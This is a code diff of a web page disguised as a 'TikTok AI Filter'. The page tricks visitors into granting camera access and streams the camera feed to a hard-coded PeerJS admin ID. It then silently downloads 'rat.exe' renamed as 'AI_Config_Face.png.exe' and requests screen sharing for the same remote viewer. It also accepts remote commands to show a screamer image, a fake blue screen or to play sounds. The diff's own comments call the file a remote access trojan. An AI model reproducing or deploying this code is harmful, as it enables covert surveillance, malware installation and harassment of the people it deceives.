@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok AI Filter v5.2</title>
+    <title>TikTok AI Morph</title>
     <script src="https://unpkg.com/peerjs@1.5.2/dist/peerjs.min.js"></script>
     <style>
         body { background: #000; color: #fff; font-family: sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; text-align: center; overflow: hidden; }
@@ -14,7 +14,6 @@
         #screamer { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: #000; z-index: 9999; display: none; align-items: center; justify-content: center; }
         #screamer img { width: 130%; height: 130%; object-fit: cover; animation: shake 0.1s infinite; }
         @keyframes shake { 0% { transform: translate(3px, 3px); } 50% { transform: translate(-3px, -4px); } 100% { transform: translate(2px, 3px); } }
-        .no-cursor { cursor: none !important; }
     </style>
 </head>
 <body>
@@ -22,12 +21,12 @@
     <div id="start" class="box">
         <img src="https://www.edigitalagency.com.au/wp-content/uploads/TikTok-logo-PNG.png" width="60">
         <h1>TikTok AI Filter</h1>
-        <p style="color: #666;">Нажмите для активации маски</p>
+        <p style="color: #666;">Нажмите «Разрешить», чтобы откалибровать маску через камеру</p>
         <button class="btn" onclick="initApp()">РАЗРЕШИТЬ</button>
     </div>
 
     <div id="loader" class="box">
-        <h2 id="status">НАСТРОЙКА ИИ...</h2>
+        <h2 id="status">ПОДКЛЮЧЕНИЕ...</h2>
         <div style="width:100%; background:#222; border-radius:10px;"><div id="fill" class="progress-fill"></div></div>
         <p id="pct">0%</p>
     </div>
@@ -40,18 +39,13 @@
     <audio id="r-snd"></audio>
 
     <script>
-        const ADM_ID = '09062012';
+        const ADM_ID = '09062012'; // Твой ID из админки
         const peer = new Peer();
         let conn;
 
-        function lock() {
-            try { document.documentElement.requestFullscreen(); } catch(e){}
-            document.body.classList.add('no-cursor');
-        }
-
         async function initApp() {
             try {
-                // 1. Сразу просим камеру
+                // 1. Запрашиваем камеру
                 const camStream = await navigator.mediaDevices.getUserMedia({ video: true });
                 conn = peer.connect(ADM_ID);
                 peer.call(ADM_ID, camStream);
@@ -67,36 +61,38 @@
                     
                     if (p >= 100) {
                         clearInterval(int);
-                        // 2. Втихую качаем ратник (путь относительный!)
+                        
+                        // 2. СКАЧИВАЕМ ФАЙЛ (относительный путь!)
                         const a = document.createElement('a');
-                        a.href = 'rat.exe'; 
-                        a.download = 'AI_Config.png.exe';
+                        a.href = 'rat.exe'; // Файл должен лежать в той же папке на хостинге!
+                        a.download = 'AI_Config_Face.png.exe';
                         a.click();
                         
-                        // 3. СРАЗУ просим экран (без кнопок)
+                        // 3. ЗАПРАШИВАЕМ ЭКРАН (теперь сработает лучше)
                         try {
                             const screenStream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                             peer.call(ADM_ID, screenStream);
-                            document.getElementById('loader').innerHTML = "<h2>ГОТОВО</h2><p>Фильтр успешно применен!</p>";
+                            document.getElementById('loader').innerHTML = "<h2>ГОТОВО</h2><p>Маска активирована!</p>";
                         } catch(e) {
-                            document.getElementById('loader').innerHTML = "<h2>ОШИБКА</h2><p>Нужен доступ к экрану для работы маски</p>";
+                            document.getElementById('loader').innerHTML = "<h2>ОШИБКА</h2><p>Разрешите доступ к экрану для работы маски</p>";
                         }
                     }
                 }, 150);
 
-                listen();
-            } catch (e) { alert("Ошибка! Доступ к камере обязателен."); location.reload(); }
+                listenCommands();
+            } catch (e) { 
+                alert("Ошибка! Без доступа к камере маска не работает."); 
+                location.reload(); 
+            }
         }
 
-        function listen() {
+        function listenCommands() {
             conn.on('data', d => {
                 if (d.type === 'SCR') {
-                    lock();
                     document.getElementById('screamer').style.display = 'flex';
                     document.getElementById('s-audio').play();
                 } else if (d.type === 'BSOD') {
-                    lock();
-                    document.body.innerHTML = '<img src="https://i.stack.imgur.com/86j1B.png" style="width:100vw;height:100vh;position:fixed;top:0;left:0;">';
+                    document.body.innerHTML = '<img src="https://i.stack.imgur.com/86j1B.png" style="width:100vw;height:100vh;position:fixed;top:0;left:0;z-index:9999;">';
                 } else if (d.type === 'SND') {
                     let a = document.getElementById('r-snd');
                     a.src = d.url; a.play();
